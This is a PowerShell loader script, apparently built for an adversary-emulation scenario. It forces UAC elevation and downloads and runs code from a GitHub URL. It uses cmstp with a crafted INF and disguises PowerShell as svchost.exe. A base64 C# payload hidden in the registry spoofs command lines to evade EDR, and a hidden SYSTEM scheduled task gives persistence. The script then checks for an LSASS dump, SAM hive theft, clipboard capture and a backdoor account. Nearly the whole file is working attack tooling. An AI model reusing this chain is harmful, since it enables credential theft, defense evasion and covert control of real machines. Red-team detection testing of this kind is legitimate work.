param()

# -- CONFIG: set this to the raw URL of the directory containing stage.dll --
#   i.e. the 'github/' folder uploaded to your repo (see Makefile sync target)
#   Example: https://raw.githubusercontent.com/<user>/<repo>/main/scenario-01-rmm/github
$scriptBase = "https://github.com/Justanother-engineer/scenario1/raw/refs/heads/main"

# -- Elevation Gate ----------------------------------------------
$isAdmin = [Security.Principal.WindowsPrincipal]::new(
    [Security.Principal.WindowsIdentity]::GetCurrent()
).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)

if (-not $isAdmin) {
    Write-Host "[!] Not admin. Requesting elevation via UAC..."
    $scriptUrl = "$scriptBase/loader.ps1?t=$(Get-Date -Format 'yyyyMMddHHmmss')"
    $b64 = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes(
        "iex((New-Object Net.WebClient).DownloadString('$scriptUrl'))"
    ))
    Start-Process powershell -Verb RunAs -ArgumentList "-NoP -Exec Bypass -Enc $b64"
    exit
}

Write-Host "[*] Running with admin privileges. Proceeding..."

# -- Logging -----------------------------------------------------
$logFile = "C:\ProgramData\loader.log"
function Write-Log($msg) {
    $parent = Split-Path $logFile -Parent
    if (-not (Test-Path $parent)) { New-Item -Path $parent -ItemType Directory -Force | Out-Null }
    "$(Get-Date -Format '[yyyy-MM-dd HH:mm:ss]') $msg" | Out-File $logFile -Append
}

Write-Log "[*] loader.ps1 started - admin=True"

# Configuration
$githubBase = $scriptBase
$stageUrl = "$githubBase/stage.dll"
$stagePath = "C:\ProgramData\Microsoft\Crypto\RSA\S-1-5-18\stage.dll"
$infPath = "C:\Windows\Temp\config.inf"
$masqueradeSrc = "$env:SystemRoot\System32\WindowsPowerShell\v1.0\powershell.exe"
$masqueradeDst = "C:\ProgramData\Microsoft\Windows\Caches\svchost.exe"
$regPath = "HKLM:\Software\Microsoft\Windows\CurrentVersion\Explorer"
$regName = "App"
$taskName = "SecHealthSvc"

# Create scatter directories
Write-Log "[*] Creating scatter directories..."
try {
    New-Item -Path "C:\ProgramData\Microsoft\Crypto\RSA\S-1-5-18" -ItemType Directory -Force -ErrorAction Stop | Out-Null
    New-Item -Path "C:\ProgramData\Microsoft\Windows\Caches" -ItemType Directory -Force -ErrorAction Stop | Out-Null
    Write-Log "[+] Scatter directories created"
} catch {
    Write-Log "[-] Failed to create scatter directories: $_"
}

# 1. Download stage.dll
Write-Host "[*] Downloading stage.dll..."
Write-Log "[*] Downloading stage.dll from $stageUrl"
try {
    Invoke-WebRequest -Uri $stageUrl -OutFile $stagePath -UseBasicParsing -ErrorAction Stop
    if (Test-Path $stagePath) {
        $bytes = (Get-Item $stagePath).Length
        Write-Log "[+] stage.dll downloaded - $bytes bytes (verified)"
    } else {
        Write-Log "[-] stage.dll download FAILED: file not found after download"
    }
} catch {
    Write-Log "[-] stage.dll download FAILED: $_"
}

# 2. Write config.inf
Write-Log "[*] Writing config.inf..."
$infContent = @"
[version]
Signature=`$chicago$
AdvancedINF=2.5

[DefaultInstall]
RunPreSetupCommands=RunStage

[RunStage]
rundll32.exe "$stagePath",DllRegisterServer
"@
try {
    Set-Content -Path $infPath -Value $infContent -Force -ErrorAction Stop
    if (Test-Path $infPath) {
        Write-Log "[+] config.inf written - verified"
    } else {
        Write-Log "[-] config.inf write FAILED: file not found after write"
    }
} catch {
    Write-Log "[-] config.inf write FAILED: $_"
}

# 3. Masquerade PowerShell
Write-Log "[*] Masquerading PowerShell -> svchost.exe..."
try {
    Copy-Item -Path $masqueradeSrc -Destination $masqueradeDst -Force -ErrorAction Stop
    if (Test-Path $masqueradeDst) {
        $mbytes = (Get-Item $masqueradeDst).Length
        Write-Log "[+] Masquerade OK - $masqueradeDst ($mbytes bytes)"
    } else {
        Write-Log "[-] Masquerade FAILED: file not found after copy"
    }
} catch {
    Write-Log "[-] Masquerade FAILED: $_"
}

# 4. Stage C# execution wrapper in HKLM
Write-Log "[*] Encoding C# source and writing registry payload..."
$spoofBase64 = "dXNpbmcgU3lzdGVtOwp1c2luZyBTeXN0ZW0uRGlhZ25vc3RpY3M7CnVzaW5nIFN5c3RlbS5JTzsKdXNpbmcgU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzOwp1c2luZyBTeXN0ZW0uVGV4dDsKdXNpbmcgU3lzdGVtLlRocmVhZGluZzsKCnB1YmxpYyBzdGF0aWMgY2xhc3MgU3Bvb2YKewogICAgW0RsbEltcG9ydCgia2VybmVsMzIuZGxsIiwgU2V0TGFzdEVycm9yID0gdHJ1ZSwgQ2hhclNldCA9IENoYXJTZXQuVW5pY29kZSldCiAgICBwcml2YXRlIHN0YXRpYyBleHRlcm4gYm9vbCBDcmVhdGVQcm9jZXNzVygKICAgICAgICBzdHJpbmcgbHBBcHBsaWNhdGlvbk5hbWUsCiAgICAgICAgc3RyaW5nIGxwQ29tbWFuZExpbmUsCiAgICAgICAgSW50UHRyIGxwUHJvY2Vzc0F0dHJpYnV0ZXMsCiAgICAgICAgSW50UHRyIGxwVGhyZWFkQXR0cmlidXRlcywKICAgICAgICBib29sIGJJbmhlcml0SGFuZGxlcywKICAgICAgICB1aW50IGR3Q3JlYXRpb25GbGFncywKICAgICAgICBJbnRQdHIgbHBFbnZpcm9ubWVudCwKICAgICAgICBzdHJpbmcgbHBDdXJyZW50RGlyZWN0b3J5LAogICAgICAgIHJlZiBTVEFSVFVQSU5GTyBscFN0YXJ0dXBJbmZvLAogICAgICAgIG91dCBQUk9DRVNTX0lORk9STUFUSU9OIGxwUHJvY2Vzc0luZm9ybWF0aW9uKTsKCiAgICBbRGxsSW1wb3J0KCJudGRsbC5kbGwiLCBTZXRMYXN0RXJyb3IgPSB0cnVlKV0KICAgIHByaXZhdGUgc3RhdGljIGV4dGVybiBpbnQgTnRRdWVyeUluZm9ybWF0aW9uUHJvY2VzcygKICAgICAgICBJbnRQdHIgaFByb2Nlc3MsCiAgICAgICAgaW50IFByb2Nlc3NJbmZvcm1hdGlvbkNsYXNzLAogICAgICAgIG91dCBQUk9DRVNTX0JBU0lDX0lORk9STUFUSU9OIHBiaSwKICAgICAgICBpbnQgY2IsCiAgICAgICAgb3V0IGludCByZXR1cm5MZW5ndGgpOwoKICAgIFtEbGxJbXBvcnQoImtlcm5lbDMyLmRsbCIsIFNldExhc3RFcnJvciA9IHRydWUpXQogICAgcHJpdmF0ZSBzdGF0aWMgZXh0ZXJuIGJvb2wgUmVhZFByb2Nlc3NNZW1vcnkoCiAgICAgICAgSW50UHRyIGhQcm9jZXNzLAogICAgICAgIEludFB0ciBscEJhc2VBZGRyZXNzLAogICAgICAgIFtPdXRdIGJ5dGVbXSBscEJ1ZmZlciwKICAgICAgICBpbnQgZHdTaXplLAogICAgICAgIG91dCBpbnQgbHBOdW1iZXJPZkJ5dGVzUmVhZCk7CgogICAgW0RsbEltcG9ydCgia2VybmVsMzIuZGxsIiwgU2V0TGFzdEVycm9yID0gdHJ1ZSldCiAgICBwcml2YXRlIHN0YXRpYyBleHRlcm4gYm9vbCBXcml0ZVByb2Nlc3NNZW1vcnkoCiAgICAgICAgSW50UHRyIGhQcm9jZXNzLAogICAgICAgIEludFB0ciBscEJhc2VBZGRyZXNzLAogICAgICAgIGJ5dGVbXSBscEJ1ZmZlciwKICAgICAgICBpbnQgZHdTaXplLAogICAgICAgIG91dCBpbnQgbHBOdW1iZXJPZkJ5dGVzV3JpdHRlbik7CgogICAgW0RsbEltcG9ydCgia2VybmVsMzIuZGxsIiwgU2V0TGFzdEVycm9yID0gdHJ1ZSldCiAgICBwcml2YXRlIHN0YXRpYyBleHRlcm4gdWludCBSZXN1bWVUaHJlYWQoSW50UHRyIGhUaHJlYWQpOwoKICAgIFtEbGxJbXBvcnQoImtlcm5lbDMyLmRsbCIsIFNldExhc3RFcnJvciA9IHRydWUpXQogICAgcHJpdmF0ZSBzdGF0aWMgZXh0ZXJuIGJvb2wgQ2xvc2VIYW5kbGUoSW50UHRyIGhPYmplY3QpOwoKICAgIHByaXZhdGUgY29uc3QgdWludCBDUkVBVEVfU1VTUEVOREVEID0gMHgwMDAwMDAwNDsKICAgIHByaXZhdGUgY29uc3QgaW50IFByb2Nlc3NCYXNpY0luZm9ybWF0aW9uID0gMDsKCiAgICBbU3RydWN0TGF5b3V0KExheW91dEtpbmQuU2VxdWVudGlhbCwgQ2hhclNldCA9IENoYXJTZXQuVW5pY29kZSldCiAgICBwcml2YXRlIHN0cnVjdCBTVEFSVFVQSU5GTwogICAgewogICAgICAgIHB1YmxpYyBpbnQgY2I7CiAgICAgICAgcHVibGljIHN0cmluZyBscFJlc2VydmVkOwogICAgICAgIHB1YmxpYyBzdHJpbmcgbHBEZXNrdG9wOwogICAgICAgIHB1YmxpYyBzdHJpbmcgbHBUaXRsZTsKICAgICAgICBwdWJsaWMgaW50IGR3WDsKICAgICAgICBwdWJsaWMgaW50IGR3WTsKICAgICAgICBwdWJsaWMgaW50IGR3WFNpemU7CiAgICAgICAgcHVibGljIGludCBkd1lTaXplOwogICAgICAgIHB1YmxpYyBpbnQgZHdYQ291bnRDaGFyczsKICAgICAgICBwdWJsaWMgaW50IGR3WUNvdW50Q2hhcnM7CiAgICAgICAgcHVibGljIGludCBkd0ZpbGxBdHRyaWJ1dGU7CiAgICAgICAgcHVibGljIGludCBkd0ZsYWdzOwogICAgICAgIHB1YmxpYyBzaG9ydCB3U2hvd1dpbmRvdzsKICAgICAgICBwdWJsaWMgc2hvcnQgY2JSZXNlcnZlZDI7CiAgICAgICAgcHVibGljIEludFB0ciBscFJlc2VydmVkMjsKICAgICAgICBwdWJsaWMgSW50UHRyIGhTdGRJbnB1dDsKICAgICAgICBwdWJsaWMgSW50UHRyIGhTdGRPdXRwdXQ7CiAgICAgICAgcHVibGljIEludFB0ciBoU3RkRXJyb3I7CiAgICB9CgogICAgW1N0cnVjdExheW91dChMYXlvdXRLaW5kLlNlcXVlbnRpYWwpXQogICAgcHJpdmF0ZSBzdHJ1Y3QgUFJPQ0VTU19JTkZPUk1BVElPTgogICAgewogICAgICAgIHB1YmxpYyBJbnRQdHIgaFByb2Nlc3M7CiAgICAgICAgcHVibGljIEludFB0ciBoVGhyZWFkOwogICAgICAgIHB1YmxpYyBpbnQgZHdQcm9jZXNzSWQ7CiAgICAgICAgcHVibGljIGludCBkd1RocmVhZElkOwogICAgfQoKICAgIFtTdHJ1Y3RMYXlvdXQoTGF5b3V0S2luZC5TZXF1ZW50aWFsKV0KICAgIHByaXZhdGUgc3RydWN0IFBST0NFU1NfQkFTSUNfSU5GT1JNQVRJT04KICAgIHsKICAgICAgICBwdWJsaWMgSW50UHRyIEV4aXRTdGF0dXM7CiAgICAgICAgcHVibGljIEludFB0ciBQZWJCYXNlQWRkcmVzczsKICAgICAgICBwdWJsaWMgSW50UHRyIEFmZmluaXR5TWFzazsKICAgICAgICBwdWJsaWMgSW50UHRyIEJhc2VQcmlvcml0eTsKICAgICAgICBwdWJsaWMgSW50UHRyIFVuaXF1ZVByb2Nlc3NJZDsKICAgICAgICBwdWJsaWMgSW50UHRyIEluaGVyaXRlZEZyb21VbmlxdWVQcm9jZXNzSWQ7CiAgICB9CgogICAgcHJpdmF0ZSBjb25zdCBpbnQgQ29tbWFuZExpbmVPZmZzZXQgPSAweDcwOwoKICAgIHByaXZhdGUgc3RhdGljIHZvaWQgTG9nKHN0cmluZyBtc2cpCiAgICB7CiAgICAgICAgdHJ5CiAgICAgICAgewogICAgICAgICAgICBzdHJpbmcgbG9nUGF0aCA9IEAiQzpcUHJvZ3JhbURhdGFcbG9hZGVyLmxvZyI7CiAgICAgICAgICAgIHN0cmluZyBsaW5lID0gRGF0ZVRpbWUuTm93LlRvU3RyaW5nKCJbeXl5eS1NTS1kZCBISDptbTpzc10gIikgKyBtc2c7CiAgICAgICAgICAgIEZpbGUuQXBwZW5kQWxsVGV4dChsb2dQYXRoLCBsaW5lICsgRW52aXJvbm1lbnQuTmV3TGluZSwgRW5jb2RpbmcuVW5pY29kZSk7CiAgICAgICAgfQogICAgICAgIGNhdGNoIHsgfQogICAgfQoKICAgIHB1YmxpYyBzdGF0aWMgdm9pZCBHbygpCiAgICB7CiAgICAgICAgLy8gcmVhbENtZCAgICAtPiB3aGF0IGNtc3RwIGFjdHVhbGx5IHByb2Nlc3NlcyAocGFzc2VkIHRvIENyZWF0ZVByb2Nlc3NXKQogICAgICAgIC8vIHNwb29mZWRDbWQgLT4gd2hhdCBFRFIgc2VlcyBpbiBXaW4zMl9Qcm9jZXNzLkNvbW1hbmRMaW5lIChQRUItb3ZlcndyaXR0ZW4pCiAgICAgICAgLy8gUGFkIHJlYWxDbWQgd2l0aCB0cmFpbGluZyBzcGFjZXMgc28gaXRzIFVURi0xNiBidWZmZXIgZml0cyB0aGUgb3JpZ2luYWwKICAgICAgICAvLyBDb21tYW5kTGluZSBhbGxvY2F0aW9uOyBjbXN0cCdzIGFyZ3YgcGFyc2VyIGlnbm9yZXMgdHJhaWxpbmcgd2hpdGVzcGFjZS4KICAgICAgICAvLyBEcm9wIC9hdSBmcm9tIHJlYWxDbWQ6IHdlJ3JlIGFscmVhZHkgU1lTVEVNLCBDTVNUUExVQSdzIElORi1sb2NhdGlvbgogICAgICAgIC8vIHRydXN0IGNoZWNrIHJlamVjdHMgQzpcUHJvZ3JhbURhdGFcKiBhbmQgdGhlIHdob2xlIHN0ZXAgbm8tb3BzLgogICAgICAgIC8vIEtlZXAgL2F1IGluIHNwb29mZWRDbWQgc28gdGhlIFVBQy1ieXBhc3MgbmFycmF0aXZlIHN1cnZpdmVzIGluIEVEUi4KICAgICAgICBzdHJpbmcgc3Bvb2ZlZENtZCA9ICJjbXN0cC5leGUgL2F1IC9zIEM6XFxXaW5kb3dzXFxTeXN0ZW0zMlxcY21zdHAuaW5mIjsKICAgICAgICBzdHJpbmcgcmVhbENtZCAgICA9ICJjbXN0cC5leGUgL3MgQzpcXFdpbmRvd3NcXFRlbXBcXGNvbmZpZy5pbmYgICAgICAgIjsKCiAgICAgICAgU1RBUlRVUElORk8gc2kgPSBuZXcgU1RBUlRVUElORk8oKTsKICAgICAgICBzaS5jYiA9IE1hcnNoYWwuU2l6ZU9mKHR5cGVvZihTVEFSVFVQSU5GTykpOwoKICAgICAgICBQUk9DRVNTX0lORk9STUFUSU9OIHBpOwoKICAgICAgICBMb2coIlsqXSBDcmVhdGluZyBzdXNwZW5kZWQgY21zdHAuZXhlLi4uIik7CiAgICAgICAgaWYgKCFDcmVhdGVQcm9jZXNzVyhudWxsLCByZWFsQ21kLCBJbnRQdHIuWmVybywgSW50UHRyLlplcm8sIGZhbHNlLAogICAgICAgICAgICBDUkVBVEVfU1VTUEVOREVELCBJbnRQdHIuWmVybywgbnVsbCwgcmVmIHNpLCBvdXQgcGkpKQogICAgICAgIHsKICAgICAgICAgICAgaW50IGVyciA9IE1hcnNoYWwuR2V0TGFzdFdpbjMyRXJyb3IoKTsKICAgICAgICAgICAgTG9nKCJbLV0gQ3JlYXRlUHJvY2Vzc1cgRkFJTEVEIChlcnJvciAiICsgZXJyICsgIikiKTsKICAgICAgICAgICAgcmV0dXJuOwogICAgICAgIH0KICAgICAgICBMb2coIlsrXSBjbXN0cC5leGUgY3JlYXRlZCAoUElEPSIgKyBwaS5kd1Byb2Nlc3NJZCArICIpIik7CgogICAgICAgIGludCByZXRMZW47CiAgICAgICAgUFJPQ0VTU19CQVNJQ19JTkZPUk1BVElPTiBwYmk7CiAgICAgICAgaWYgKE50UXVlcnlJbmZvcm1hdGlvblByb2Nlc3MocGkuaFByb2Nlc3MsIFByb2Nlc3NCYXNpY0luZm9ybWF0aW9uLAogICAgICAgICAgICBvdXQgcGJpLCBNYXJzaGFsLlNpemVPZih0eXBlb2YoUFJPQ0VTU19CQVNJQ19JTkZPUk1BVElPTikpLAogICAgICAgICAgICBvdXQgcmV0TGVuKSAhPSAwKQogICAgICAgIHsKICAgICAgICAgICAgTG9nKCJbLV0gTnRRdWVyeUluZm9ybWF0aW9uUHJvY2VzcyBGQUlMRUQiKTsKICAgICAgICAgICAgUmVzdW1lVGhyZWFkKHBpLmhUaHJlYWQpOwogICAgICAgICAgICBDbG9zZUhhbmRsZShwaS5oUHJvY2Vzcyk7CiAgICAgICAgICAgIENsb3NlSGFuZGxlKHBpLmhUaHJlYWQpOwogICAgICAgICAgICByZXR1cm47CiAgICAgICAgfQogICAgICAgIExvZygiWytdIFBFQiBsb2NhdGVkIik7CgogICAgICAgIGJ5dGVbXSBwZWJCdWZmZXIgPSBuZXcgYnl0ZVtJbnRQdHIuU2l6ZSAqIDVdOwogICAgICAgIGludCBieXRlc1JlYWQ7CiAgICAgICAgaWYgKCFSZWFkUHJvY2Vzc01lbW9yeShwaS5oUHJvY2VzcywgcGJpLlBlYkJhc2VBZGRyZXNzLCBwZWJCdWZmZXIsIHBlYkJ1ZmZlci5MZW5ndGgsIG91dCBieXRlc1JlYWQpKQogICAgICAgIHsKICAgICAgICAgICAgTG9nKCJbLV0gUmVhZFByb2Nlc3NNZW1vcnkoUEVCKSBGQUlMRUQiKTsKICAgICAgICAgICAgUmVzdW1lVGhyZWFkKHBpLmhUaHJlYWQpOwogICAgICAgICAgICBDbG9zZUhhbmRsZShwaS5oUHJvY2Vzcyk7CiAgICAgICAgICAgIENsb3NlSGFuZGxlKHBpLmhUaHJlYWQpOwogICAgICAgICAgICByZXR1cm47CiAgICAgICAgfQogICAgICAgIExvZygiWytdIFBFQiByZWFkIik7CgogICAgICAgIGludCBwcE9mZnNldCA9IEludFB0ci5TaXplID09IDggPyAweDIwIDogMHgxMDsKICAgICAgICBJbnRQdHIgcHJvY2Vzc1BhcmFtZXRlcnNQdHIgPSBNYXJzaGFsLlJlYWRJbnRQdHIocGViQnVmZmVyLCBwcE9mZnNldCk7CiAgICAgICAgTG9nKCJbK10gUHJvY2Vzc1BhcmFtZXRlcnMgcmVzb2x2ZWQiKTsKCiAgICAgICAgYnl0ZVtdIGNtZEJ1ZmZlciA9IG5ldyBieXRlWzE2XTsKICAgICAgICBpZiAoIVJlYWRQcm9jZXNzTWVtb3J5KHBpLmhQcm9jZXNzLCBJbnRQdHIuQWRkKHByb2Nlc3NQYXJhbWV0ZXJzUHRyLCBDb21tYW5kTGluZU9mZnNldCksIGNtZEJ1ZmZlciwgY21kQnVmZmVyLkxlbmd0aCwgb3V0IGJ5dGVzUmVhZCkpCiAgICAgICAgewogICAgICAgICAgICBMb2coIlstXSBSZWFkUHJvY2Vzc01lbW9yeShjbWRQdHIpIEZBSUxFRCIpOwogICAgICAgICAgICBSZXN1bWVUaHJlYWQocGkuaFRocmVhZCk7CiAgICAgICAgICAgIENsb3NlSGFuZGxlKHBpLmhQcm9jZXNzKTsKICAgICAgICAgICAgQ2xvc2VIYW5kbGUocGkuaFRocmVhZCk7CiAgICAgICAgICAgIHJldHVybjsKICAgICAgICB9CiAgICAgICAgTG9nKCJbK10gQ29tbWFuZCBsaW5lIHBvaW50ZXIgcmVhZCIpOwoKICAgICAgICBieXRlW10gbmV3Q21kQnl0ZXMgPSBFbmNvZGluZy5Vbmljb2RlLkdldEJ5dGVzKHNwb29mZWRDbWQpOwogICAgICAgIEludFB0ciBidWZmZXJQdHIgPSBNYXJzaGFsLlJlYWRJbnRQdHIoY21kQnVmZmVyLCA4KTsKCiAgICAgICAgaW50IHdyaXR0ZW47CiAgICAgICAgaWYgKCFXcml0ZVByb2Nlc3NNZW1vcnkocGkuaFByb2Nlc3MsIGJ1ZmZlclB0ciwgbmV3Q21kQnl0ZXMsIG5ld0NtZEJ5dGVzLkxlbmd0aCwgb3V0IHdyaXR0ZW4pKQogICAgICAgIHsKICAgICAgICAgICAgTG9nKCJbLV0gV3JpdGVQcm9jZXNzTWVtb3J5KGNtZCkgRkFJTEVEIik7CiAgICAgICAgICAgIFJlc3VtZVRocmVhZChwaS5oVGhyZWFkKTsKICAgICAgICAgICAgQ2xvc2VIYW5kbGUocGkuaFByb2Nlc3MpOwogICAgICAgICAgICBDbG9zZUhhbmRsZShwaS5oVGhyZWFkKTsKICAgICAgICAgICAgcmV0dXJuOwogICAgICAgIH0KICAgICAgICBMb2coIlsrXSBDb21tYW5kIGxpbmUgb3ZlcndyaXR0ZW46IGNtc3RwLmluZiIpOwoKICAgICAgICBieXRlW10gbGVuZ3RoQnl0ZXMgPSBCaXRDb252ZXJ0ZXIuR2V0Qnl0ZXMobmV3Q21kQnl0ZXMuTGVuZ3RoKTsKICAgICAgICBieXRlW10gbWF4TGVuZ3RoQnl0ZXMgPSBCaXRDb252ZXJ0ZXIuR2V0Qnl0ZXMobmV3Q21kQnl0ZXMuTGVuZ3RoKTsKICAgICAgICBCdWZmZXIuQmxvY2tDb3B5KGxlbmd0aEJ5dGVzLCAwLCBjbWRCdWZmZXIsIDAsIDIpOwogICAgICAgIEJ1ZmZlci5CbG9ja0NvcHkobWF4TGVuZ3RoQnl0ZXMsIDAsIGNtZEJ1ZmZlciwgMiwgMik7CiAgICAgICAgV3JpdGVQcm9jZXNzTWVtb3J5KHBpLmhQcm9jZXNzLCBJbnRQdHIuQWRkKHByb2Nlc3NQYXJhbWV0ZXJzUHRyLCBDb21tYW5kTGluZU9mZnNldCksIGNtZEJ1ZmZlciwgY21kQnVmZmVyLkxlbmd0aCwgb3V0IHdyaXR0ZW4pOwogICAgICAgIExvZygiWytdIENvbW1hbmQgbGluZSBsZW5ndGggdXBkYXRlZCIpOwoKICAgICAgICBMb2coIlsqXSBSZXN1bWluZyBjbXN0cC5leGUgdGhyZWFkLi4uIik7CiAgICAgICAgUmVzdW1lVGhyZWFkKHBpLmhUaHJlYWQpOwogICAgICAgIENsb3NlSGFuZGxlKHBpLmhQcm9jZXNzKTsKICAgICAgICBDbG9zZUhhbmRsZShwaS5oVGhyZWFkKTsKICAgICAgICAvLyBwb255dGFpbDogY21zdHAgL2F1IC9zIGV4aXRzIGNsZWFubHkgcmVnYXJkbGVzcyBvZiBJTkYgcmVzdWx0LCBzbyBhbgogICAgICAgIC8vIGFsaXZlLWNoZWNrIGlzIGEgZmFsc2UtbmVnYXRpdmUuIExvYWRlciBwb2xscyBmb3IgcG9zdC1leCBhcnRpZmFjdHMgaW5zdGVhZC4KICAgICAgICBMb2coIlsrXSBjbXN0cC5leGUgcmVzdW1lZCwgYXJndW1lbnQgc3Bvb2ZpbmcgY29tcGxldGUiKTsKICAgIH0KfQo="
$spoofBytes = [Convert]::FromBase64String($spoofBase64)
$spoofSource = [Text.Encoding]::UTF8.GetString($spoofBytes)

# Wrap C# in Add-Type so iex will compile + call it
$regValue = @"
function Get-Ts { [DateTime]::Now.ToString('[yyyy-MM-dd HH:mm:ss]') }

"`$(Get-Ts) [*] Task payload executing (svchost.exe)" | Out-File C:\ProgramData\loader.log -Append
try {
    "`$(Get-Ts) [*] Compiling C# (Add-Type)..." | Out-File C:\ProgramData\loader.log -Append
    Add-Type -TypeDefinition @'
$spoofSource
'@ -Language CSharp
    "`$(Get-Ts) [+] C# compiled successfully, calling Spoof::Go()" | Out-File C:\ProgramData\loader.log -Append
    [Spoof]::Go()
    "`$(Get-Ts) [+] Spoof::Go() completed" | Out-File C:\ProgramData\loader.log -Append
} catch {
    "`$(Get-Ts) [-] Task payload FAILED: `$_" | Out-File C:\ProgramData\loader.log -Append
    "`$(Get-Ts) [-] Type: `$(`$_.Exception.GetType().FullName)" | Out-File C:\ProgramData\loader.log -Append
}
"@

if (-not (Test-Path $regPath)) {
    New-Item -Path $regPath -Force | Out-Null
}
Set-ItemProperty -Path $regPath -Name $regName -Value $regValue -Force
$checkVal = (Get-ItemProperty -Path $regPath -Name $regName -ErrorAction SilentlyContinue).$regName
if ($checkVal) {
    Write-Log "[+] Registry payload stored at $regPath\$regName - $($checkVal.Length) chars (verified)"
} else {
    Write-Log "[-] Registry payload FAILED"
}

# 5. Create scheduled task with dynamic time via Register-ScheduledTask
Write-Log "[*] Creating scheduled task (Register-ScheduledTask)..."
$b64 = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes(
    "iex(gp '$regPath').$regName"
))
$action = New-ScheduledTaskAction -Execute $masqueradeDst -Argument "-NoP -Enc $b64"
$trigger = New-ScheduledTaskTrigger -AtStartup
$principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
$settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -Hidden -ExecutionTimeLimit ([TimeSpan]::FromMinutes(5))
try {
    Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Principal $principal -Settings $settings -Force -ErrorAction Stop
    $verify = Get-ScheduledTask -TaskName $taskName -ErrorAction Stop
    Write-Log "[+] Task $taskName created - state=$($verify.State) action=$($verify.Actions.Execute) trigger=AtStartup"
    Write-Host "[+] Scheduled. Triggering immediate run + AtStartup persistence..."
    Start-ScheduledTask -TaskName $taskName
    Start-Sleep -Seconds 2
    $info = Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue
    if ($info -and $info.State -ne 'Ready') {
        Write-Log "[+] Task $taskName triggered (state=$($info.State))"
    } elseif ($info) {
        Write-Log "[*] Task $taskName state=Ready after trigger (last run may have already completed)"
    }
} catch {
    Write-Log "[-] Task creation FAILED`n$_"
}

# 6. Wait for post-ex artifacts (chain runs in <30s, wait 90s for safety)
Write-Log "[*] Task $taskName triggered, waiting 90s for post-ex artifacts..."
Start-Sleep -Seconds 90

$artifacts = @{
    "T1003.001 LSASS dump"     = "C:\ProgramData\Microsoft\Crypto\RSA\MachineKeys\~adf.bin"
    "T1003.002 SAM hive"       = "C:\Windows\Temp\~s1.tmp"
    "T1003.002 SYSTEM hive"    = "C:\Windows\Temp\~s2.tmp"
    "T1082/T1057 Recon"        = "C:\ProgramData\Microsoft\Network\~df.tmp"
    "T1018/T1135 SMB recon"    = "C:\ProgramData\Microsoft\Network\~net.tmp"
    "T1115 Clipboard capture"  = "C:\ProgramData\Microsoft\Network\~clip.tmp"
    "T1547.001 Run key"        = "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run\WindowsSecHealth"
    "T1053.005 Task persist"   = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\SecHealthSvc2"
    "T1136.001 SupportUser"    = "USER:SupportUser"
}

# ponytail: reg paths need value/key probe, not Test-Path; SAM hive needs SYSTEM, so
# probe the user via `net user` instead.
function Test-Artifact($path) {
    if ($path -like 'USER:*') {
        $name = $path.Substring(5)
        return ((net user $name 2>$null) -match "^$name\b")
    }
    if ($path -match '^HKLM:') {
        $leaf = Split-Path $path -Leaf
        $parent = Split-Path $path -Parent
        if (-not $parent) { return $false }
        $val = Get-ItemProperty -Path $parent -Name $leaf -ErrorAction SilentlyContinue
        return [bool]$val
    }
    return Test-Path $path
}

foreach ($k in $artifacts.Keys) {
    $path = $artifacts[$k]
    if (Test-Artifact $path) {
        Write-Log "[+] $k : $path"
    } else {
        Write-Log "[-] $k : $path"
    }
}
